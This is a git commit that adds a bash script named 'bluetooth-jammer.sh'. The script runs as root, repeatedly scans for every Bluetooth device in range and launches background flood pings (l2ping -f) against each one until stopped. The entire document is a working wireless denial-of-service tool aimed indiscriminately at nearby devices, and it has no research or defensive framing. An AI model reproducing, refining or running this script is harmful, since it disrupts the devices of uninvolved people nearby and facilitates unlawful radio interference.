8c310dd8c389ab852b00b69be915d406f4055832
Solanaceae <89823371+Atropa-Solanaceae@users.noreply.github.com>
2023-01-17 10:43:09 -0500

    Add files via upload

---
+++ bluetooth-jammer.sh
@@ -0,0 +1,45 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+if [ "$EUID" -ne 0 ]; then
+    echo "You need to run as root!"
+    exit 1
+fi
+
+cleanup() {
+    if [ -n "$(ps -A -o comm,pmem,rss | grep l2ping)" ]; then
+        killall l2ping
+    fi
+    printf "\n"
+    read -p "Do you want to turn off bluetooth (hci0)? [Y/n] " RESP
+    if [ $RESP == 'Y' ]; then
+        echo "Turning bluetooth off..."
+        sudo hciconfig hci0 down
+        echo "Done!"
+    fi
+    exit 0
+}
+
+trap cleanup EXIT
+
+echo "Turning bluetooth on (hci0)..."
+sudo hciconfig hci0 up
+echo "Done!"
+echo ""
+
+while [ 1 ]; do
+    echo "Scanning..."
+    DEVICES=$(hcitool scan | awk 'length NR>2{print $1}' 2>&1)
+    echo "Done scanning..."
+    echo ""
+
+    for bd_addr in $DEVICES; do
+        echo "Pinging ${bd_addr}..."
+        sudo l2ping -f $bd_addr 2>&1 > /dev/null &
+    done
+
+    if [ -n "${DEVICES}" ]; then
+        echo ""
+        sleep 5
+    fi
+done
